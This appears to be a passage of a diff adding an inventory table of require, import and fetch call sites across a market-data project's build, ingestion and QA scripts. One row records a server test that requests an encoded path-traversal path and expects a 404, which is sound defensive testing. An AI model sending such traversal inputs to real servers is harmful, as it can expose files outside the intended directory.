+| scripts/discover/build-company-logos.mjs | ` fetch(url, { ...opts, headers: { "User-Agent": USER_AGENT, "Api-User-Agent": USER_AGENT, ...(opts.headers &#124;&#124; {}) } }) ` |
+| scripts/discover/build-company-logos.mjs | ` fetch(url, { redirect: "follow", signal: AbortSignal.timeout(15000), ` |
+| scripts/discover/build-discover-data.mjs | ` import(join(root, "scripts", "market", "universe-source.mjs")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "quant", "engines", "market-factors.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "quant", "engines", "published-close.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "quant", "engines", "return-series.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "quant", "engines", "display-policy.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "high52w.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "scoring.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "indicators.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "technical-intelligence.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "klartext.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "unternehmen.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "fundamentals.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "relevance.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "discovery-eligibility.js")) ` |
+| scripts/discover/build-discover-data.mjs | ` require(join(root, "discover", "engines", "im-blick.js")) ` |
+| scripts/discover/build-im-blick-live.mjs | ` require(join(root, "discover", "engines", "im-blick.js")) ` |
+| scripts/discover/build-im-blick-live.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| scripts/discover/build-im-blick-live.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/discover/build-im-blick-live.mjs | ` require(join(root, "discover", "engines", "refresh-plan.js")) ` |
+| scripts/discover/build-im-blick-live.mjs | ` require(join(root, "quant", "engines", "realtime", "trading-session.js")) ` |
+| scripts/discover/check-im-blick-live.mjs | ` require(join(ROOT, "discover", "engines", "refresh-plan.js")) ` |
+| scripts/discover/check-im-blick-live.mjs | ` fetch(url, { cache: "no-store", signal: AbortSignal.timeout(20000) }) ` |
+| scripts/discover/europe-continuity-live-qa.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') ` |
+| scripts/discover/europe-public-live-qa.mjs | ` import(sourceRoot+'/scripts/access-gate/build.mjs') ` |
+| scripts/discover/global-live-qa.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') ` |
+| scripts/discover/lazy-fault-qa.mjs | ` require((process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES &#124;&#124; '') + '/playwright') ` |
+| scripts/discover/logo-candidates.mjs | ` fetch(url, { headers: { "User-Agent": ua, Accept: "application/json,text/html,image/*,*/*" }, signal: AbortSignal.timeout(20000) }) ` |
+| scripts/discover/replay-im-blick.mjs | ` import(join(root, "scripts", "market", "universe-source.mjs")) ` |
+| scripts/discover/replay-im-blick.mjs | ` require(join(root, "discover", "engines", "scoring.js")) ` |
+| scripts/discover/replay-im-blick.mjs | ` require(join(root, "discover", "engines", "high52w.js")) ` |
+| scripts/discover/replay-im-blick.mjs | ` require(join(root, "discover", "engines", "discovery-eligibility.js")) ` |
+| scripts/discover/replay-im-blick.mjs | ` require(join(root, "discover", "engines", "im-blick.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "engines", "contract.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "engines", "klartext.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "engines", "scoring.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "engines", "high52w.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "quant", "engines", "display-policy.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "methodology", "discover-v1.json")) ` |
+| scripts/discover/verify-discover-data.mjs | ` require(join(root, "discover", "engines", "relevance.js")) ` |
+| scripts/discover/verify-discover-data.mjs | ` import(join(root, "scripts", "market", "preview-scope.mjs")) ` |
+| scripts/discover/watchlist-coupling-qa.mjs | ` fetch('/quant/data/universe/instruments/' + globalThis.VUCore.Identity.shardKey('MSFT') + '.json')).json()).instruments.find(i => i.symbol === 'MSFT' && i.active).ins ` |
+| scripts/market/apply-exchange-directory.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/apply-exchange-directory.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/market/apply-exchange-directory.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/market/apply-exchange-directory.mjs | ` fetch("https://www.nasdaqtrader.com/dynamic/SymDir/" + name + ".txt", { signal: AbortSignal.timeout(45000) }) ` |
+| scripts/market/apply-name-layer-class.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/apply-name-layer-class.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/market/assert-daily-lifecycle-health.mjs | ` require(join(root, "quant", "engines", "realtime", "trading-session.js")) ` |
+| scripts/market/assert-daily-lifecycle-health.mjs | ` require(join(root, "quant", "engines", "daily-lifecycle-health.js")) ` |
+| scripts/market/assert-intraday-delivery.mjs | ` require(join(engines, "realtime", "delivery-watchdog.js")) ` |
+| scripts/market/assert-intraday-delivery.mjs | ` require(join(engines, "realtime", "trading-session.js")) ` |
+| scripts/market/assert-intraday-delivery.mjs | ` require(join(root, "quant", "config", "market-calendar.json")) ` |
+| scripts/market/assert-intraday-delivery.mjs | ` fetch(url, { headers: { "cache-control": "no-cache" } }) ` |
+| scripts/market/attach-live-domain.mjs | ` fetch(API + pfad, Object.assign({ ` |
+| scripts/market/build-company-names.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/market/build-company-names.mjs | ` import(join(ROOT, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) ` |
+| scripts/market/build-company-names.mjs | ` import(join(root, "scripts", "market", "universe-source.mjs")) ` |
+| scripts/market/build-company-names.mjs | ` fetch(SEC_URL, { headers: { "User-Agent": ua, "Accept": "application/json" } }) ` |
+| scripts/market/build-company-names.mjs | ` require(join(ROOT, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/build-company-names.mjs | ` require(join(ROOT, "quant", "engines", "symbol-mapping.js")) ` |
+| scripts/market/build-company-names.mjs | ` fetch(url, init) ` |
+| scripts/market/build-coverage-metrics.mjs | ` require(join(root, "quant", "engines", "coverage-metrics.js")) ` |
+| scripts/market/build-coverage-metrics.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/market/build-coverage-metrics.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/market/build-coverage-metrics.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/market/build-coverage-metrics.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/market/build-currency-coverage.mjs | ` require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) ` |
+| scripts/market/build-fx-history-ecb.mjs | ` require(join(ROOT, "providers", "ecb", "adapter.js")) ` |
+| scripts/market/build-fx-history-ecb.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) ` |
+| scripts/market/build-fx-history-ecb.mjs | ` require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) ` |
+| scripts/market/build-fx-history-ecb.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) ` |
+| scripts/market/build-fx-history-ecb.mjs | ` fetch(FEED.url, { headers: { Accept: "application/xml" } }) ` |
+| scripts/market/build-fx-history.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) ` |
+| scripts/market/build-fx-history.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) ` |
+| scripts/market/build-fx-history.mjs | ` require(join(ROOT, "quant", "engines", "capabilities.js")) ` |
+| scripts/market/build-fx-history.mjs | `` fetch(`${BASE}/tiingo/fx/${ticker}/prices?resampleFreq=1day&startDate=${startDate}`, `` |
+| scripts/market/build-fx-pair-requirements.mjs | ` require(join(ROOT, "quant", "engines", "fx", "currency-registry.js")) ` |
+| scripts/market/build-index-membership.mjs | ` require(join(root, "quant", "engines", "index-membership.js")) ` |
+| scripts/market/build-index-membership.mjs | ` fetch(url, { headers, redirect: "follow" }) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(engines, "market-factors.js")) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(engines, "return-semantics.js")) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/build-market-factors.mjs | ` require(join(engines, "ranking-hygiene.js")) ` |
+| scripts/market/build-market-pulse.mjs | ` require(join(root, "quant/engines/multi-asset/market-pulse.js")) ` |
+| scripts/market/build-market-pulse.mjs | ` require(join(root, "core/identity.js")) ` |
+| scripts/market/build-market-universe.mjs | ` require(join(root, "quant", "engines", "instrument-classification.js")) ` |
+| scripts/market/build-market-universe.mjs | ` fetch(TICKERS_URL, { headers }) ` |
+| scripts/market/build-ownership-signals.mjs | ` require(join(ROOT, "quant", "engines", "ownership-signals.js")) ` |
+| scripts/market/build-ownership-signals.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/market/build-ownership-signals.mjs | ` import(join(root, "scripts/market/universe-source.mjs")).then(({ resolveProductUniverse }) => ` |
+| scripts/market/build-us-eligibility.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/build-us-eligibility.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/market/build-us-eligibility.mjs | ` require(join(root, "quant", "engines", "coverage-metrics.js")).VERSION, ` |
+| scripts/market/build-us-security-master.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/build-us-security-master.mjs | ` import(join(root, "scripts", "market", "build-market-universe.mjs")) ` |
+| scripts/market/build-us-security-master.mjs | ` import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) ` |
+| scripts/market/build-us-security-master.mjs | ` fetch(TICKERS_URL, { headers }) ` |
+| scripts/market/build-us-security-master.mjs | ` require(       join(root, "quant", "engines", "instrument-classification.js")).VERSION, ` |
+| scripts/market/check-freshness.mjs | ` require(join(root, "quant", "engines", "realtime", "trading-session.js")) ` |
+| scripts/market/check-freshness.mjs | ` require(join(root, "quant", "engines", "realtime", "freshness.js")) ` |
+| scripts/market/check-freshness.mjs | ` require(join(DEFAULT_ROOT, "core", "identity.js")) ` |
+| scripts/market/check-freshness.mjs | ` fetch(url, { headers: { "cache-control": "no-cache" } }) ` |
+| scripts/market/classify-rejections.mjs | ` require(join(root, "quant", "engines", "rejection-lifecycle.js")) ` |
+| scripts/market/evaluate-provider.mjs | ` require(join(root, "quant", "engines", "symbol-mapping.js")) ` |
+| scripts/market/evaluate-provider.mjs | ` require(join(root, "quant", "engines", "market-quality.js")) ` |
+| scripts/market/evaluate-provider.mjs | ` require(spec.module) ` |
+| scripts/market/evaluate-provider.mjs | ` fetch(url, init) ` |
+| scripts/market/expand-us-universe.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/fetch-market-data.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/fetch-market-data.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/fetch-market-data.mjs | ` require(join(engines, "data-mode.js")) ` |
+| scripts/market/fetch-market-data.mjs | ` require(join(root, "providers", "twelve-data", "adapter.js")) ` |
+| scripts/market/fetch-market-data.mjs | ` fetch(url, init) ` |
+| scripts/market/guard-listing-continuity.mjs | ` require(join(root, "quant", "engines", "survivorship-control.js")) ` |
+| scripts/market/ingest-fx-intraday.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-rates.js")) ` |
+| scripts/market/ingest-fx-intraday.mjs | ` require(join(ROOT, "quant", "engines", "fx", "fx-provider-registry.js")) ` |
+| scripts/market/ingest-fx-intraday.mjs | ` require(join(ROOT, "quant", "engines", "capabilities.js")) ` |
+| scripts/market/ingest-fx-intraday.mjs | `` fetch(`${BASE}/tiingo/fx/top?tickers=${ticker}`, `` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "realtime", "trading-session.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "realtime", "intraday-snapshot.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "realtime", "freshness.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(engines, "realtime", "intraday-scope.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(DEFAULT_ROOT, "core", "identity.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/ingest-intraday.mjs | ` fetch(url, init) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "quant/engines/multi-asset/instrument-catalog.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "quant/api/multi-asset-contract.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/tiingo/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/ecb/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/us-treasury/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/nyfed/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/bundesbank/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/eia/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/fred/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/nikkei/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "providers/fmp/adapter.js")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "quant/config/multi-asset.json")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "quant/config/market-calendar.json")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` require(join(root, "quant/config/multi-asset-instruments.json")) ` |
+| scripts/market/ingest-multi-asset.mjs | ` fetch(url, { headers: { "User-Agent": UA }, signal: ctrl.signal }) ` |
+| scripts/market/ingest-multi-asset.mjs | ` fetch(u, i) ` |
+| scripts/market/ingest-multi-asset.mjs | ` fetch(url, { headers: { "User-Agent": UA } }) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "return-series.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "price-semantics.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "market-eod-gate.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "rejection-lifecycle.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/ingest-tiingo.mjs | ` fetch(url, init) ` |
+| scripts/market/lib/corporate-action-confirmations.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/market/lib/security-master-duplicate-resolution.mjs | ` require(join(root, "quant", "engines", "us-security-master.js")) ` |
+| scripts/market/lib/security-master-duplicate-resolution.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/market/lib/split-evidence-supplements.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/market/long-series-repair-plan.mjs | ` require(join(REPO_ROOT, "core", "data-quality.js")) ` |
+| scripts/market/preflight-zero-cost.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/market/preflight-zero-cost.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/market/preflight-zero-cost.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/market/preflight-zero-cost.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/market/probe-cloudflare-scope.mjs | ` fetch(API + p.pfad, { ` |
+| scripts/market/probe-free-sources.mjs | ` fetch(url, { method: post ? "POST" : method, headers: h, signal: ctrl.signal, redirect: "follow", ` |
+| scripts/market/probe-index-sources.mjs | ` fetch(url, { headers, signal: ctrl.signal, redirect: "follow" }) ` |
+| scripts/market/probe-multi-asset.mjs | ` require(join(root, "quant", "engines", "multi-asset", "instrument-catalog.js")) ` |
+| scripts/market/probe-multi-asset.mjs | ` fetch(url, { headers, signal: ctrl.signal }) ` |
+| scripts/market/probe-provider-split.mjs | ` fetch(url, { headers: { Authorization: "Token " + key, "Content-Type": "application/json" } }) ` |
+| scripts/market/probe-tiingo-fx.mjs | ` require(join(root, "quant", "engines", "fx", "fx-capability.js")) ` |
+| scripts/market/probe-tiingo-fx.mjs | ` require(join(root, "quant", "engines", "capabilities.js")) ` |
+| scripts/market/probe-tiingo-fx.mjs | ` fetch(url, { ` |
+| scripts/market/publish-discover-series.mjs | ` require(join(HERE, "..", "..", "quant", "engines", "survivorship-control.js")) ` |
+| scripts/market/publish-discover-series.mjs | ` require(join(HERE, "..", "..", "quant", "engines", "published-close.js")) ` |
+| scripts/market/publish-discover-series.mjs | ` require(join(HERE, "..", "..", "quant", "engines", "return-series.js")) ` |
+| scripts/market/publish-discover-series.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/publish-discover-series.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "series-sampling.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "published-close.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "display-policy.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "survivorship-control.js")) ` |
+| scripts/market/publish-long-series.mjs | ` require(join(root, "quant", "engines", "corporate-action-evidence.js")) ` |
+| scripts/market/publish-long-series.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/market/publish-long-series.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/market/qualify-providers.mjs | ` require(join(root, "quant", "engines", "provider-qualification.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(engines, "canonical-total-return.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/refresh-benchmark-history.mjs | ` fetch(url, init) }) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "history-store.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` require(join(engines, "zero-cost-guard.js")) ` |
+| scripts/market/repair-total-return-history.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/market/repair-total-return-history.mjs | ` fetch(url, init) }) ` |
+| scripts/market/run-pacemaker.mjs | ` require(join(engines, "realtime", "pacemaker.js")) ` |
+| scripts/market/run-pacemaker.mjs | ` require(join(engines, "realtime", "trading-session.js")) ` |
+| scripts/market/run-pacemaker.mjs | ` require(join(root, "quant", "config", "market-calendar.json")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(engines, "market-store.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(engines, "display-policy.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/run-scale-gate.mjs | ` fetch(url, init) ` |
+| scripts/market/security-master-v130-evidence.mjs | ` require(join(ROOT, "quant/engines/us-security-master.js")) ` |
+| scripts/market/security-master-v130-evidence.mjs | ` require(join(ROOT, "core/identity.js")) ` |
+| scripts/market/smoke-vu-live.mjs | ` require(join(root, "quant", "engines", "realtime", "market-hours.js")) ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/version"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/health"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch() setzt ihn nicht, es ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/version"), { ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/version"), { headers: { Origin: FREMDER_URSPRUNG } }) ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/version"), { ` |
+| scripts/market/smoke-vu-live.mjs | ` fetch(httpUrl("/health"), { headers: { Origin: ERLAUBTER_URSPRUNG } }) ` |
+| scripts/market/split-supplement-effect.mjs | ` require(join(ROOT, "quant", "engines", "published-close.js")) ` |
+| scripts/market/split-supplement-effect.mjs | ` require(join(ROOT, "quant", "engines", "corporate-action-evidence.js")) ` |
+| scripts/market/split-supplement-effect.mjs | ` require(join(ROOT, "quant", "engines", "weekly-real-adapter.cjs")) ` |
+| scripts/market/split-supplement-effect.mjs | ` require(join(ROOT, "fundamental", "engine", "catalog.js")) ` |
+| scripts/market/split-supplement-effect.mjs | ` import(join(ROOT, "scripts", "fundamental", "build-history.mjs")) ` |
+| scripts/market/study-return-basis-universe.mjs | ` require(join(ROOT, "core", "identity.js")) ` |
+| scripts/market/study-return-basis-universe.mjs | ` require(join(ROOT, "quant/engines/return-series.js")) ` |
+| scripts/market/study-return-basis-universe.mjs | ` require(join(ROOT, "quant/engines/return-basis-comparison.js")) ` |
+| scripts/market/study-return-basis-universe.mjs | ` require(join(ROOT, "quant/engines/sic-peer-taxonomy.js")) ` |
+| scripts/market/sync-history-store.mjs | ` require(join(root, "quant", "engines", "history-store.js")) ` |
+| scripts/market/sync-history-store.mjs | ` require(join(root, "quant", "engines", "zero-cost-guard.js")) ` |
+| scripts/market/sync-history-store.mjs | ` require(join(root, "quant", "engines", "bar-codec.js")) ` |
+| scripts/market/sync-history-store.mjs | ` require(join(root, "quant", "engines", "survivorship-control.js")) ` |
+| scripts/market/sync-history-store.mjs | ` import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) ` |
+| scripts/market/sync-history-store.mjs | ` import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) ` |
+| scripts/market/verify-dynamic-subscribe.mjs | ` require(join(root, "providers", "tiingo", "realtime.js")) ` |
+| scripts/market/verify-dynamic-subscribe.mjs | ` require(join(root, "quant", "engines", "realtime", "market-hours.js")) ` |
+| scripts/market/verify-live-candle.mjs | ` require(join(engines, "realtime", "transport.js")) ` |
+| scripts/market/verify-live-candle.mjs | ` require(join(engines, "realtime", "bar-merge.js")) ` |
+| scripts/market/verify-live-candle.mjs | ` require(join(engines, "realtime", "market-hours.js")) ` |
+| scripts/market/verify-live-candle.mjs | ` require(join(root, "providers", "tiingo", "realtime.js")) ` |
+| scripts/market/verify-live-candle.mjs | `` fetch(`${REST_BASE}/iex/${encodeURIComponent(sym.toLowerCase())}`, `` |
+| scripts/market/verify-request-limits.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/verify-request-limits.mjs | ` fetch(url, opts &#124;&#124; {}) ` |
+| scripts/market/verify-runtime-load.mjs | ` require(join(engines, "realtime", "bar-merge.js")) ` |
+| scripts/market/verify-runtime-load.mjs | ` require(join(root, "providers", "tiingo", "realtime.js")) ` |
+| scripts/market/verify-semantics-parity.mjs | ` require(join(root, "quant", "engines", "price-semantics.js")) ` |
+| scripts/market/verify-tiingo-commercial.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/verify-tiingo-commercial.mjs | ` require(join(engines, "realtime", "market-hours.js")) ` |
+| scripts/market/verify-tiingo-commercial.mjs | ` require(join(engines, "market-quality.js")) ` |
+| scripts/market/verify-tiingo-commercial.mjs | ` fetch(url, init) ` |
+| scripts/market/verify-tiingo-realtime.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/verify-tiingo-realtime.mjs | ` require(join(root, "providers", "tiingo", "realtime.js")) ` |
+| scripts/market/verify-tiingo-realtime.mjs | ` require(join(engines, "realtime", "market-hours.js")) ` |
+| scripts/market/verify-tiingo-realtime.mjs | ` require(join(engines, "realtime", "session-policy.js")) ` |
+| scripts/market/verify-tiingo-realtime.mjs | ` fetch(url, init), ` |
+| scripts/market/verify-tiingo-runtime.mjs | ` require(join(engines, "symbol-mapping.js")) ` |
+| scripts/market/verify-tiingo-runtime.mjs | ` require(join(root, "providers", "tiingo", "adapter.js")) ` |
+| scripts/market/verify-tiingo-runtime.mjs | ` fetch(url, init) ` |
+| scripts/market/verify-vu-live-e2e.mjs | ` import(join(root, "worker", "tests", "harness.mjs")) ` |
+| scripts/market/verify-vu-live-e2e.mjs | ` import(join(root, "worker", "src", "vu-live.mjs")) ` |
+| scripts/market/verify-vu-live-e2e.mjs | ` fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) ` |
+| scripts/marketstack/europe-marketstack-diagnostics-once.mjs | ` fetch (sharedBudget.reserve). ` |
+| scripts/mobile/tests/server.test.mjs | ` fetch(base+'/') ` |
+| scripts/mobile/tests/server.test.mjs | ` fetch(base+'/NV.json.gz') ` |
+| scripts/mobile/tests/server.test.mjs | ` fetch(base+'/absent.json')).status,404) ` |
+| scripts/mobile/tests/server.test.mjs | ` fetch(base+'/%2e%2e%2foutside')).status,404) ` |
+| scripts/quality/audit-fx-provider-seam.mjs | ` require(join(FXDIR, "fx-rates.js")) ` |
+| scripts/quality/audit-fx-provider-seam.mjs | ` require(join(FXDIR, "fx-provider-registry.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "core", "identity.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "core", "data-quality.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "core", "chart-history.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "quant", "engines", "return-series.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "quant", "engines", "realtime", "trading-session.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "core", "chart-standard.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "quant", "engines", "fx", "fx-rates.js")) ` |
+| scripts/quality/chart-parity.mjs | ` require(join(REPO_ROOT, "quant", "engines", "fx", "currency-contract.js")) ` |
+| scripts/quality/find-unused.mjs | ` require(), fetch(), HTML src/href, CSS url(), ` |
+| scripts/quality/fundamental-compare-qa.mjs | ` require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) ` |
+| scripts/quality/shell-browser-qa.mjs | ` require(arg('playwright', process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright')) ` |
+| scripts/quality/tests/find-unused.test.mjs | ` fetch(base + name) ` |
+| scripts/quality/tests/find-unused.test.mjs | `` import(`./${name}.mjs`) `` |
